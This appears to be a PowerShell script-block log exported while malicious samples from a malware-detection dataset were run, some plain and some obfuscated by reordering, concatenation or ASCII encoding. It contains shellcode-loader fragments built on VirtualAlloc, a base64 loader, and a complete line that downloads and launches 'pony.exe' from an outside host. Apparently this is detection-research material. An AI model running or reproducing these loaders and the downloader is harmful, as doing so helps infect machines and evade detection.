"TimeCreated","ScriptPath","ScriptLength","ScriptPreview"
"8/6/2026 10:35:35 AM","","6","prompt"
"8/6/2026 10:35:28 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:35:28 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:35:28 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:35:28 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:35:27 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\183.ps1","2238","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:35:20 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:35:20 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:35:20 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:35:20 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:35:19 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:35:19 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\183.ps1","2753","&( $PShoMe[21]+$PsHomE[30]+'X')( ((""{5}{39}{1}{29}{40}{27}{13}{14}{45}{7}{37}{32}{41}{15}{12}{38}{2}{24}{30}{22}{16}{33}{10}{36}{23}{20}{44}{43}{17}{28}{34}{9}{8}{4}{6}{35}{25}{3}{42}{11}{26}{18}{19}{"
"8/6/2026 10:35:12 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:35:12 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:35:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:35:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:35:12 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:35:11 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\183.ps1","2682","& ( ([STRiNg]$VeRBoSeprefEreNCe)[1,3]+'X'-Join'') ((('8ltc = JVW[DllImport(Tbx'+'kernel32.dllTbx)]public static extern IntPtr VirtualAlloc(IntPtr lpAd'+'dress, uint dwSize, uint flAllocationType, uint"
"8/6/2026 10:35:04 AM","","2234"," $c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr "
"8/6/2026 10:35:03 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\183.ps1","20","{ ( [CHaR] [int]$_)}"
"8/6/2026 10:35:03 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\183.ps1","7729"," ""$(set-vaRIAble  'ofS' '' ) ""+ [STRIng]('36k99;32:61:32-39S91O68X108>108>73W109_112;111W114X116X40>34W107>101;114W110W101O108;51O50X46X100X108k108:34S41>93:112S117X98>108_105;99-32;115S116k97:116_105"
"8/6/2026 10:34:56 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:34:56 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:34:56 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:34:56 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:34:55 AM","C:\TA\project-ta\data_spliting\test_set\malicious\183.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:34:48 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:34:48 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:34:48 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:34:48 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:34:47 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1827.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:34:40 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:34:40 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:34:40 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:34:40 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:34:39 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:34:39 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1827.ps1","2928"," ((""{25}{2}{9}{31}{44}{30}{6}{0}{50}{55}{40}{21}{14}{41}{68}{22}{24}{37}{34}{49}{48}{28}{54}{66}{4}{42}{39}{38}{51}{61}{47}{59}{16}{35}{56}{17}{10}{15}{43}{29}{5}{18}{63}{32}{23}{8}{19}{64}{3}{36}{65}"
"8/6/2026 10:34:32 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:34:32 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:34:32 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:34:32 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:34:31 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:34:31 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1827.ps1","2684",". ((get-vARiAbLE '*MDr*').nAME[3,11,2]-JoiN'') ( (('TWyc = nki[DllImport(lz2kernel32.dlllz2)]public static exter'+'n IntPtr Vir'+'tu'+'alAlloc(In'+'tPtr lpAddre'+'ss, uint dwSize, uint f'+'lAllocation"
"8/6/2026 10:34:23 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:34:23 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:34:23 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:34:23 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:34:23 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:34:23 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1827.ps1","9793","[cHAR[]] ( 36, 99 ,32 ,61 , 32, 39 ,91, 68 ,108 , 108,73,109 , 112, 111, 114, 116 , 40, 34 , 107, 101 ,114 ,110,101,108, 51 ,50 , 46,100 ,108 , 108 ,34 , 41,93, 112 , 117 , 98 , 108, 105 ,99 , 32,115 "
"8/6/2026 10:34:15 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:34:15 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:34:15 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:34:15 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:34:15 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1827.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:34:07 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:34:07 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:34:07 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:34:07 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:34:07 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1822.ps1","2337","$fhA = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:33:59 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:33:59 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:33:59 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:33:59 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:33:59 AM","","2331","$fhA = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:33:59 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1822.ps1","3070",". ( $psHoMe[4]+$PsHoMe[34]+'x')( ((""{33}{47}{20}{29}{39}{23}{70}{18}{26}{55}{3}{1}{13}{58}{46}{40}{71}{52}{69}{14}{42}{19}{6}{54}{30}{72}{27}{21}{57}{60}{5}{10}{66}{17}{34}{63}{67}{59}{44}{0}{24}{36}{"
"8/6/2026 10:33:52 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:33:52 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:33:51 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:33:51 AM","","2331","$fhA = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:33:51 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1822.ps1","2748","(('pI4fhA = ESY[DllImp'+'ort(m3kkernel32.dllm3k)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dw'+'S'+'ize, uint '+'flAllocationType, uint flProtect);[DllImport(m3kkernel32.dllm3k)]"
"8/6/2026 10:33:43 AM","","2331","$fhA = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:33:43 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1822.ps1","22","{ ([iNT] $_-AS[CHAR])}"
"8/6/2026 10:33:43 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1822.ps1","8022"," -Join('36l102c104H65W32l61d32-39H91H68j108N108W73c109l112l111l114j116s40c34c107H101l114-110l101j108c51H50N46H100l108j108H34H41l93N112c117W98c108c105j99s32l115l116d97W116d105j99N32H101W120-116c101j114"
"8/6/2026 10:33:35 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:33:35 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:33:35 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:33:35 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:33:35 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1822.ps1","2331","$fhA = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:33:27 AM","","3330","Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {"
"8/6/2026 10:33:27 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1811.ps1","2299","$s=Ne`W`-OBJe`cT IO.MemoryStream(,[Convert]::FromBase64String(""H4sIAAAAAAAAAL1Xe2/aSBD/O3wK6xTJto7wCCRNK1XqAjGPYkIwr4RDaPGuzYa1l9prHr32u9/4QUsv6V1Olc6SxXp3ZnbmN08sKi8sGTBbmoJQ5WJMg5AJX7nM5c4boi2V98oHN"
"8/6/2026 10:33:18 AM","","3330","Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {"
"8/6/2026 10:33:18 AM","","2288","$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(""H4sIAAAAAAAAAL1Xe2/aSBD/O3wK6xTJto7wCCRNK1XqAjGPYkIwr4RDaPGuzYa1l9prHr32u9/4QUsv6V1Olc6SxXp3ZnbmN08sKi8sGTBbmoJQ5WJMg5AJX7nM5c4boi2V98oHNedE"
"8/6/2026 10:33:18 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1811.ps1","2724","INVOKE-eXPrEsSiOn ((((""{40}{7}{10}{25}{20}{29}{17}{41}{23}{15}{14}{0}{18}{38}{42}{9}{30}{3}{26}{8}{24}{11}{43}{35}{27}{39}{37}{32}{2}{19}{1}{46}{6}{12}{33}{36}{22}{4}{21}{28}{34}{16}{31}{13}{44}{45}{5"
"8/6/2026 10:33:10 AM","","3330","Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {"
"8/6/2026 10:33:10 AM","","2288","$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(""H4sIAAAAAAAAAL1Xe2/aSBD/O3wK6xTJto7wCCRNK1XqAjGPYkIwr4RDaPGuzYa1l9prHr32u9/4QUsv6V1Olc6SxXp3ZnbmN08sKi8sGTBbmoJQ5WJMg5AJX7nM5c4boi2V98oHNedE"
"8/6/2026 10:33:10 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1811.ps1","2583","(('{1}s=New-Object IO.MemoryStream(,[Convert]::FromBase64Stri'+'ng({0}H4sIAA'+'AAAAAAAL1Xe2/aSBD/O3wK6xTJto7wCCRNK1XqAjGPYkIwr4RDaPGuzYa1l9prHr32u9/4QUsv6'+'V1Olc6'+'SxXp3ZnbmN08sKi8sGTBbmoJQ5'+'WJMg5"
"8/6/2026 10:33:02 AM","","3330","Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {"
"8/6/2026 10:33:02 AM","","2288","$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(""H4sIAAAAAAAAAL1Xe2/aSBD/O3wK6xTJto7wCCRNK1XqAjGPYkIwr4RDaPGuzYa1l9prHr32u9/4QUsv6V1Olc6SxXp3ZnbmN08sKi8sGTBbmoJQ5WJMg5AJX7nM5c4boi2V98oHNedE"
"8/6/2026 10:33:02 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1811.ps1","20","{ ( [chAR] [InT]$_)}"
"8/6/2026 10:33:02 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1811.ps1","7810",".((Gv '*mDr*').nAME[3,11,2]-JOiN'') ( -Join ( '36<115q61d78s101q119:45s79E98E106&101:99d116q32&73d79}46&77P101P109s111P114<121P83P116q114<101%97P109}40}44}91&67:111d110q118:101:114d116%93&58<58<70s114"
"8/6/2026 10:32:54 AM","","3330","Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {"
"8/6/2026 10:32:54 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1811.ps1","2288","$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(""H4sIAAAAAAAAAL1Xe2/aSBD/O3wK6xTJto7wCCRNK1XqAjGPYkIwr4RDaPGuzYa1l9prHr32u9/4QUsv6V1Olc6SxXp3ZnbmN08sKi8sGTBbmoJQ5WJMg5AJX7nM5c4boi2V98oHNedE"
"8/6/2026 10:32:46 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1810.ps1","2341","$uLJcb = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntP"
"8/6/2026 10:32:38 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:32:38 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:32:38 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:32:38 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:32:38 AM","","2335","$uLJcb = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntP"
"8/6/2026 10:32:38 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1810.ps1","3113","& ( $PsHOmE[4]+$psHOME[30]+'X') ( ((""{46}{38}{50}{11}{44}{53}{34}{56}{0}{39}{3}{1}{42}{41}{61}{36}{29}{21}{19}{66}{31}{16}{6}{2}{70}{65}{33}{40}{27}{54}{13}{37}{14}{64}{26}{17}{22}{23}{48}{8}{24}{28}{"
"8/6/2026 10:32:30 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:32:30 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:32:30 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:32:30 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:32:30 AM","","2335","$uLJcb = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntP"
"8/6/2026 10:32:30 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1810.ps1","2798"," inVOKE-eXPResSioN( ('NEUuLJcb = qI1[DllImport(Uwakernel32.dllUwa)]public sta'+'tic e'+'xtern IntPtr Virtu'+'alAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType,'+' uint flProtect);[DllImport"
"8/6/2026 10:32:22 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:32:22 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:32:22 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:32:22 AM","","2335","$uLJcb = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntP"
"8/6/2026 10:32:22 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1810.ps1","19","{ ([char][inT] $_)}"
"8/6/2026 10:32:22 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1810.ps1","7959"," &( $PShOMe[21]+$pshomE[30]+'X') ( [sTRING]::JoIN('' ,('36}117L76n74%99L98L32O61!32%39{91q68{108}108{73!109%112g111q114@116}40%34@107!101O114q110O101@108g51@50!46g100{108q108g34L41O93@112%117L98{108}1"
"8/6/2026 10:32:14 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:32:14 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:32:14 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:32:14 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:32:14 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1810.ps1","2335","$uLJcb = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntP"
"8/6/2026 10:32:06 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:32:06 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:32:06 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:32:06 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:32:06 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1764.ps1","127","(n`E`w-obJEcT System.Net.WebClient).DownloadFile('http://worldnit.com/pony.exe','fleeble.exe');ST`Ar`T-pRO`CESS 'fleeble.exe'
"
"8/6/2026 10:31:58 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:31:58 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:31:58 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:31:58 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:31:58 AM","","120","(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/pony.exe','fleeble.exe');Start-Process 'fleeble.exe'"
"8/6/2026 10:31:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1764.ps1","328","iNvOKe-EXpreSSIon ((((""{14}{3}{8}{5}{2}{18}{19}{10}{7}{20}{12}{4}{11}{0}{16}{9}{15}{17}{6}{1}{13}"" -f 'ony.exeEL7,EL7fleeble.','E','i','ect System.Net.WebClient','t','wnloadF','eeble.exe','tp://wor','"
"8/6/2026 10:31:50 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:31:50 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:31:50 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:31:50 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:31:50 AM","","120","(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/pony.exe','fleeble.exe');Start-Process 'fleeble.exe'"
"8/6/2026 10:31:49 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1764.ps1","286"," & ((get-VARIAble '*MDR*').nAmE[3,11,2]-JOiN'') ( (('('+'New-Object S'+'y'+'stem.N'+'et.W'+'ebC'+'lient'+').Down'+'loadF'+'ile({'+'0'+'}htt'+'p://w'+'orldnit'+'.com/pon'+'y'+'.exe'+'{0},{0}fleebl'+'e."
"8/6/2026 10:31:42 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:31:42 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:31:42 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:31:42 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:31:42 AM","","120","(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/pony.exe','fleeble.exe');Start-Process 'fleeble.exe'"
"8/6/2026 10:31:41 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1764.ps1","22","{( [Int]$_ -As[CHAr])}"
"8/6/2026 10:31:41 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1764.ps1","666"," [StRINg]::JOIn( '' , ( ( 40,78 , 101, 119, 45,79 ,98 ,106 , 101, 99,116,32 ,83, 121 , 115,116, 101, 109 , 46, 78 , 101 ,116 ,46 , 87, 101,98 ,67 , 108 , 105 ,101 , 110,116, 41,46,68 , 111, 119, 110,1"
"8/6/2026 10:31:34 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:31:34 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:31:33 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:31:33 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:31:33 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1764.ps1","120","(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/pony.exe','fleeble.exe');Start-Process 'fleeble.exe'"
"8/6/2026 10:31:26 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:31:26 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:31:26 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:31:26 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:31:25 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1754.ps1","2339","$leF = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:31:18 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:31:18 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:31:18 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:31:18 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:31:17 AM","","2334","$leF = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:31:17 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1754.ps1","3064","(((""{43}{38}{3}{45}{22}{71}{6}{59}{31}{52}{44}{25}{49}{39}{48}{68}{64}{56}{70}{33}{55}{66}{21}{42}{62}{26}{51}{60}{47}{34}{12}{14}{58}{28}{4}{27}{15}{65}{53}{10}{17}{18}{37}{67}{69}{63}{23}{40}{29}{2}"
"8/6/2026 10:31:10 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:31:10 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:31:10 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:31:10 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:31:09 AM","","2334","$leF = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
